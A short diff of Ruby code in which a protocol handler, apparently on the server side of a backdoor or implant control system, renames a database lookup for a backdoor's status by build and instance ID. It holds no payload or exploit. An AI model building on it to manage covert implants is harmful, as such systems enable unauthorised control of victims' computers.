@@ -108,7 +108,7 @@ class Protocol
     message = aes_encrypt(ks, DB.backdoor_signature)
 
     # ask the database the status of the backdoor
-    status, bid = DB.status_of(build_id, instance_id, subtype)
+    status, bid = DB.backdoor_status(build_id, instance_id, subtype)
 
     response = [Commands::PROTO_NO].pack('I')
     # what to do based on the backdoor status
